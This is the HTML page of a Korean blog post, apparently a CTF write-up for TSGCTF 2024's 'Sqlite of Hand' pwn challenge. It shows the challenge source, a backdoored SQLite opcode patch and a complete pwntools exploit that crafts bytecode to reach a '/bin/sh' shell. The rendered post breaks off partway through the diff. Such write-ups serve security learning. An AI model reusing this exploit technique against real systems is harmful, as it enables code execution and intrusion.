@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TSGCTF 2024 - Sqlite of Hand | msh1307</title>
+<meta name="keywords" content="TSGCTF 2024 Pwn, Sqlite of Hand">
+<meta name="description" content="TSG CTF 소리가 들려서 들어가봤는데 Hard 0솔짜리 있길래 잡았다.
+근데 도커를 안줘서 로되리안 났다.
+티켓 열고 도커 달라고 찡찡댔는데 갑자기 솔버 나와서 ubuntu24.04 인거만 알려주고 힌트 못준다고해서 그냥 마저 랭겜했다.
+SQLite of Hand Analysis int main() { setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); sqlite3 *db; sqlite3_stmt *stmt; char *buf = mmap((void *)MAP_ADDR, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0); if (buf == MAP_FAILED) { perror(&#34;mmap&#34;); return 1; } if (sqlite3_open(&#34;hello.">
+<meta name="author" content="">
+<link rel="canonical" href="https://msh1307.kr/blog/tsgctf2024_sqlite_of_hand/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-BR89V2WEC0');
+</script>
+<link rel="icon" href="https://msh1307.kr/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
+<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="TSGCTF 2024 - Sqlite of Hand" />
+<meta property="og:description" content="TSG CTF 소리가 들려서 들어가봤는데 Hard 0솔짜리 있길래 잡았다.
+근데 도커를 안줘서 로되리안 났다.
+티켓 열고 도커 달라고 찡찡댔는데 갑자기 솔버 나와서 ubuntu24.04 인거만 알려주고 힌트 못준다고해서 그냥 마저 랭겜했다.
+SQLite of Hand Analysis int main() { setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); sqlite3 *db; sqlite3_stmt *stmt; char *buf = mmap((void *)MAP_ADDR, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0); if (buf == MAP_FAILED) { perror(&#34;mmap&#34;); return 1; } if (sqlite3_open(&#34;hello." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://msh1307.kr/blog/tsgctf2024_sqlite_of_hand/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2024-12-18T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2024-12-18T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TSGCTF 2024 - Sqlite of Hand"/>
+<meta name="twitter:description" content="TSG CTF 소리가 들려서 들어가봤는데 Hard 0솔짜리 있길래 잡았다.
+근데 도커를 안줘서 로되리안 났다.
+티켓 열고 도커 달라고 찡찡댔는데 갑자기 솔버 나와서 ubuntu24.04 인거만 알려주고 힌트 못준다고해서 그냥 마저 랭겜했다.
+SQLite of Hand Analysis int main() { setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); sqlite3 *db; sqlite3_stmt *stmt; char *buf = mmap((void *)MAP_ADDR, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0); if (buf == MAP_FAILED) { perror(&#34;mmap&#34;); return 1; } if (sqlite3_open(&#34;hello."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Blogs",
+      "item": "https://msh1307.kr/blog/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "TSGCTF 2024 - Sqlite of Hand",
+      "item": "https://msh1307.kr/blog/tsgctf2024_sqlite_of_hand/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TSGCTF 2024 - Sqlite of Hand",
+  "name": "TSGCTF 2024 - Sqlite of Hand",
+  "description": "TSG CTF 소리가 들려서 들어가봤는데 Hard 0솔짜리 있길래 잡았다.\n근데 도커를 안줘서 로되리안 났다.\n티켓 열고 도커 달라고 찡찡댔는데 갑자기 솔버 나와서 ubuntu24.04 인거만 알려주고 힌트 못준다고해서 그냥 마저 랭겜했다.\nSQLite of Hand Analysis int main() { setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); sqlite3 *db; sqlite3_stmt *stmt; char *buf = mmap((void *)MAP_ADDR, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0); if (buf == MAP_FAILED) { perror(\u0026#34;mmap\u0026#34;); return 1; } if (sqlite3_open(\u0026#34;hello.",
+  "keywords": [
+    "TSGCTF 2024 Pwn", "Sqlite of Hand"
+  ],
+  "articleBody": "TSG CTF 소리가 들려서 들어가봤는데 Hard 0솔짜리 있길래 잡았다.\n근데 도커를 안줘서 로되리안 났다.\n티켓 열고 도커 달라고 찡찡댔는데 갑자기 솔버 나와서 ubuntu24.04 인거만 알려주고 힌트 못준다고해서 그냥 마저 랭겜했다.\nSQLite of Hand Analysis int main() { setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); sqlite3 *db; sqlite3_stmt *stmt; char *buf = mmap((void *)MAP_ADDR, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0); if (buf == MAP_FAILED) { perror(\"mmap\"); return 1; } if (sqlite3_open(\"hello.db\", \u0026db) != SQLITE_OK) { fprintf(stderr, \"Cannot open database: %s\\n\", sqlite3_errmsg(db)); return 1; } if (sqlite3_prepare_v2(db, \"select 1;\", -1, \u0026stmt, NULL) != SQLITE_OK) { fprintf(stderr, \"Failed to prepare statement: %s\\n\", sqlite3_errmsg(db)); sqlite3_close(db); return 1; } printf(\"size\u003e \"); unsigned n = read_int(); if (n \u003e= (N_OPs * SIZE_OP)) { puts(\"too long\"); return 1; } printf(\"your bytecode\u003e \"); readn(buf, n); char *target = malloc(N_OPs * SIZE_OP); memcpy(target, buf, n); // adhoc: stmt-\u003eaOp = target void **aOp = (void **)((unsigned long long)stmt + 136); *aOp = target; sqlite3_step((sqlite3_stmt *)stmt); sqlite3_close(db); return 0; } 그냥 바이트코드 수정하는 기능 준다.\ndiff -u -r home/ubuntu/sqlpwn/dist/sqlite/src/vdbe.c sqlite/src/vdbe.c --- /home/ubuntu/sqlpwn/dist/sqlite/src/vdbe.c\t2024-12-07 19:57:30.000000000 +0000 +++ sqlite/src/vdbe.c\t2024-12-12 06:07:20.514797634 +0000 @@ -9039,6 +9039,24 @@ } #endif +/* Opcode: Pack P1 P2 * * * +** Synopsis: r[P2] = p64(r[p1]) +** +** Pack p64 integer to a string. A Christmas present for you. +*/ +case OP_Pack: { + pIn1 = \u0026aMem[pOp-\u003ep1]; + pOut = \u0026aMem[pOp-\u003ep2]; + pOut-\u003eflags = MEM_Str|MEM_Static|MEM_Term; + i64 *buf = malloc(sizeof(i64)); + *buf = pIn1-\u003eu.i; + pOut-\u003ez = (char*)buf; + pOut-\u003en = 8; + pOut-\u003eenc = encoding; + UPDATE_MAX_BLOBSIZE(pOut); + break; +} + /* Opcode: Noop * * * * * ** ** Do nothing. Continue downward to the next opcode. 백도어 기능 추가해준다.\nstring으로 인식시켜준다.\nExploit https://github.com/sqlite/sqlite/blob/master/src/vdbe.c\nhttps://github.com/sqlite/sqlite/blob/master/src/vdbemem.c\n이거 두개 열심히 읽고 익스했다.\nstr, blob 같은 애들이랑 long, int랑은 실제 데이터 저장하는 구조가 다르고, 바이트코드에서 raw하게 포인터를 p4로 넘겨받아서 처리한다.\n근데 int, long을 str로 캐스팅하는 백도어 명령을 넣어줬으니 알잘딱해서 고민하다보면, 0x38 align을 깨고 raw하게 메모리에 구조체를 만들 수 있는 primitive를 만들 수 있게 된다.\n그리고 바이트 코드 한번 넣으면 끝이니 원큐에 익스를 성공해야한다.\n원래 Sqlite3 단에서 바이트코드 컴파일할때 p4에 builtin 함수들 객체 넘겨줘서 여러 함수 호출 가능한거라 leak하고 코드 실행을 어케할건지 생각을 해봐야한다.\n잘 생각해보면 메모리를 다 갖고 놀 수 있으면 런타임에 자기가 leak하고 자기 자신 코드를 패치하면 된다.\n구조체 만드는 primitive를 위해서 다음 기능을 쓰면 된다.\ncase OP_Concat: { /* same as TK_CONCAT, in1, in2, out3 */ i64 nByte; /* Total size of the output string or blob */ u16 flags1; /* Initial flags for P1 */ u16 flags2; /* Initial flags for P2 */ pIn1 = \u0026aMem[pOp-\u003ep1]; pIn2 = \u0026aMem[pOp-\u003ep2]; pOut = \u0026aMem[pOp-\u003ep3]; testcase( pOut==pIn2 ); assert( pIn1!=pOut ); flags1 = pIn1-\u003eflags; testcase( flags1 \u0026 MEM_Null ); testcase( pIn2-\u003eflags \u0026 MEM_Null ); if( (flags1 | pIn2-\u003eflags) \u0026 MEM_Null ){ sqlite3VdbeMemSetNull(pOut); break; } if( (flags1 \u0026 (MEM_Str|MEM_Blob))==0 ){ if( sqlite3VdbeMemStringify(pIn1,encoding,0) ) goto no_mem; flags1 = pIn1-\u003eflags \u0026 ~MEM_Str; }else if( (flags1 \u0026 MEM_Zero)!=0 ){ if( sqlite3VdbeMemExpandBlob(pIn1) ) goto no_mem; flags1 = pIn1-\u003eflags \u0026 ~MEM_Str; } flags2 = pIn2-\u003eflags; if( (flags2 \u0026 (MEM_Str|MEM_Blob))==0 ){ if( sqlite3VdbeMemStringify(pIn2,encoding,0) ) goto no_mem; flags2 = pIn2-\u003eflags \u0026 ~MEM_Str; }else if( (flags2 \u0026 MEM_Zero)!=0 ){ if( sqlite3VdbeMemExpandBlob(pIn2) ) goto no_mem; flags2 = pIn2-\u003eflags \u0026 ~MEM_Str; } nByte = pIn1-\u003en + pIn2-\u003en; if( nByte\u003edb-\u003eaLimit[SQLITE_LIMIT_LENGTH] ){ goto too_big; } if( sqlite3VdbeMemGrow(pOut, (int)nByte+2, pOut==pIn2) ){ goto no_mem; } MemSetTypeFlag(pOut, MEM_Str); if( pOut!=pIn2 ){ memcpy(pOut-\u003ez, pIn2-\u003ez, pIn2-\u003en); assert( (pIn2-\u003eflags \u0026 MEM_Dyn) == (flags2 \u0026 MEM_Dyn) ); pIn2-\u003eflags = flags2; } memcpy(\u0026pOut-\u003ez[pIn2-\u003en], pIn1-\u003ez, pIn1-\u003en); assert( (pIn1-\u003eflags \u0026 MEM_Dyn) == (flags1 \u0026 MEM_Dyn) ); pIn1-\u003eflags = flags1; if( encoding\u003eSQLITE_UTF8 ) nByte \u0026= ~1; pOut-\u003ez[nByte]=0; pOut-\u003ez[nByte+1] = 0; pOut-\u003eflags |= MEM_Term; pOut-\u003en = (int)nByte; pOut-\u003eenc = encoding; UPDATE_MAX_BLOBSIZE(pOut); break; } 오랜만에 해서 그런지 재밌게 풀었다.\nExploit script from pwn import * OP_Init = 8# /* jump, synopsis: Start at P2 */ OP_PureFunc = 65# /* synopsis: r[P3]=func(r[P2@NP]) */ OP_Function = 66# /* synopsis: r[P3]=func(r[P2@NP]) */ OP_Halt = 70# OP_Integer = 71# /* synopsis: r[P2]=P1 */ OP_Int64 = 72# /* synopsis: r[P2]=P4 */ OP_Blob = 77# /* synopsis: r[P2]=P4 (len=P1) */ OP_IntCopy = 82# /* synopsis: r[P2]=r[P1] */ OP_AddImm = 86# /* synopsis: r[P1]=r[P1]+P2 */ OP_Noop =185# OP_Pack =187# backdoored one OPFLG_JUMP = 0x01# /* jump: P2 holds jmp target */ OPFLG_IN1 = 0x02# /* in1: P1 is an input */ OPFLG_IN2 = 0x04# /* in2: P2 is an input */ OPFLG_IN3 = 0x08# /* in3: P3 is an input */ OPFLG_OUT2 = 0x10# /* out2: P2 is an output */ OPFLG_OUT3 = 0x20# /* out3: P3 is an output */ OPFLG_NCYCLE = 0x40# /* ncycle:Cycles count against P1 */ OPSZ=24 def gen(opcode, p1 = 0, p2 = 0 , p3 = 0 ,p4 = 0 ,p4_type = 0, p5 = 0): payload = b'' payload += p8(opcode) payload += p8(p4_type) payload += p16(p5) payload += p32(p1) payload += p32(p2) payload += p32(p3) payload += p64(p4) return payload # https://files.openstack.org/mirror/ubuntu/pool/main/g/glibc/ # p = process(['./out.bin'], env={\"LD_LIBRARY_PATH\":\".\"}) # context.log_level='debug' # p = remote('34.146.186.1', 21002) p = remote('localhost', 4444) sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) MAP_ADDR = 0x2000000000 DATA_ADDR = 0x1000 + MAP_ADDR code = gen(OP_Init, 0, 1) # jmp to pc L=20 D=19 DST = 18 one = 0x00000000000984cf code += gen(OP_IntCopy, (-627)\u00260xffffffff, L) code += gen(OP_AddImm, L, (-0x181b0 - 0x212000 + one)\u00260xffffffff) code += gen(OP_Blob, p1=0x0, p2=DST, p4=DATA_ADDR) # load blob p1 sz, p2 idx code += gen(OP_IntCopy, (-37)\u00260xffffffff, D) code += gen(OP_AddImm, D, 0x1cf7) def imm64(offset, target): assert target != 0 code = b'' code += gen(OP_Blob, p1=8, p2=0, p4=DATA_ADDR + offset) # load blob p1 sz, p2 idx code += gen(112, p2=target, p1=0, p3=target) # concat p2 + p1 = p3(out) OP_CONCAT, not 111 return code def immX(offset, target, x): code = b'' code += gen(OP_Blob, p1=x, p2=0, p4=DATA_ADDR + offset) # load blob p1 sz, p2 idx code += gen(112, p2=target, p1=0, p3=target) # concat p2 + p1 = p3(out) OP_CONCAT return code def pack64(r, target): code = b'' code += gen(OP_Pack, p1=r, p2=0) code += gen(112, p2=target, p1=0, p3=target) # concat p2 + p1 = p3(out) OP_CONCAT return code code += imm64(0, DST) code += gen(OP_AddImm, D, 8) code += pack64(D, DST) code += gen(OP_AddImm, D, (-8)\u00260xffffffff) code += immX(16, DST, 16) code += pack64(L, DST) code += immX(32, DST, 0x360) code += gen(OP_AddImm, L, (0x58740+0x1b-one)\u00260xffffffff) code += pack64(L, DST) code += gen(OP_IntCopy, D, 1834) # p4 add code += gen(OP_Noop, p3=0x43,p2=0x43,p1=0x43) * 2 code += gen(OP_PureFunc, p4 = 0xdeadbeef, p3=0x43,p2=0x43,p1=0x43) code += gen(OP_Halt) assert len(code) \u003c 0x1000 payload = code payload += b'\\xff' * (0x1000 - len(code)) payload += b'/bin/sh\\x00' # Mem * pOut payload += p64(0x0) # FuncDef *pFunc payload += p64(0x002000001000) * 3 # /bin/sh payload += b'B' * 0x350 assert (len(payload) // 24 \u003c 0x100) sla(b'size\u003e ', str(len(payload))) sa(b'your bytecode\u003e ', payload) p.interactive() ",
+  "wordCount" : "1125",
+  "inLanguage": "en",
+  "datePublished": "2024-12-18T00:00:00Z",
+  "dateModified": "2024-12-18T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://msh1307.kr/blog/tsgctf2024_sqlite_of_hand/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "msh1307",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://msh1307.kr/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header sticky-header">
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-BR89V2WEC0');
+    </script>
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://msh1307.kr/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/blog" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/categories" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
+    <h1 class="post-title">
+      TSGCTF 2024 - Sqlite of Hand
+    </h1>
+    <div class="post-meta">
+
+
+December 2024
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">‎ Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#sqlite-of-hand" aria-label="SQLite of Hand">SQLite of Hand</a><ul>
+                        
+                <li>
+                    <a href="#analysis" aria-label="Analysis">Analysis</a></li>
+                <li>
+                    <a href="#exploit" aria-label="Exploit">Exploit</a><ul>
+                        
+                <li>
+                    <a href="#exploit-script" aria-label="Exploit script">Exploit script</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>TSG CTF 소리가 들려서 들어가봤는데 Hard 0솔짜리 있길래 잡았다.<br>
+근데 도커를 안줘서 로되리안 났다.<br>
+티켓 열고 도커 달라고 찡찡댔는데 갑자기 솔버 나와서 ubuntu24.04 인거만 알려주고 힌트 못준다고해서 그냥 마저 랭겜했다.</p>
+<h1 id="sqlite-of-hand">SQLite of Hand<a hidden class="anchor" aria-hidden="true" href="#sqlite-of-hand">#</a></h1>
+<h2 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setvbuf</span>(stdin, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setvbuf</span>(stderr, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sqlite3 <span style="color:#f92672">*</span>db;
+</span></span><span style="display:flex;"><span>    sqlite3_stmt <span style="color:#f92672">*</span>stmt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)MAP_ADDR, <span style="color:#ae81ff">0x2000</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE, MAP_ANONYMOUS <span style="color:#f92672">|</span> MAP_PRIVATE <span style="color:#f92672">|</span> MAP_FIXED, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (buf <span style="color:#f92672">==</span> MAP_FAILED)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mmap&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sqlite3_open</span>(<span style="color:#e6db74">&#34;hello.db&#34;</span>, <span style="color:#f92672">&amp;</span>db) <span style="color:#f92672">!=</span> SQLITE_OK)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Cannot open database: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">sqlite3_errmsg</span>(db));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sqlite3_prepare_v2</span>(db, <span style="color:#e6db74">&#34;select 1;&#34;</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>stmt, NULL) <span style="color:#f92672">!=</span> SQLITE_OK)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Failed to prepare statement: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">sqlite3_errmsg</span>(db));
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sqlite3_close</span>(db);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;size&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> n <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_int</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">&gt;=</span> (N_OPs <span style="color:#f92672">*</span> SIZE_OP))
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;too long&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;your bytecode&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">readn</span>(buf, n);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>target <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(N_OPs <span style="color:#f92672">*</span> SIZE_OP);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(target, buf, n);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// adhoc: stmt-&gt;aOp = target
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>aOp <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)stmt <span style="color:#f92672">+</span> <span style="color:#ae81ff">136</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>aOp <span style="color:#f92672">=</span> target;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sqlite3_step</span>((sqlite3_stmt <span style="color:#f92672">*</span>)stmt);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sqlite3_close</span>(db);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>그냥 바이트코드 수정하는 기능 준다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>diff <span style="color:#f92672">-</span>u <span style="color:#f92672">-</span>r home<span style="color:#f92672">/</span>ubuntu<span style="color:#f92672">/</span>sqlpwn<span style="color:#f92672">/</span>dist<span style="color:#f92672">/</span>sqlite<span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>vdbe.c sqlite<span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>vdbe.c
+</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>ubuntu<span style="color:#f92672">/</span>sqlpwn<span style="color:#f92672">/</span>dist<span style="color:#f92672">/</span>sqlite<span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>vdbe.c	<span style="color:#ae81ff">2024</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">07</span> <span style="color:#ae81ff">19</span><span style="color:#f92672">:</span><span style="color:#ae81ff">57</span><span style="color:#f92672">:</span><span style="color:#ae81ff">30.000000000</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">0000</span>
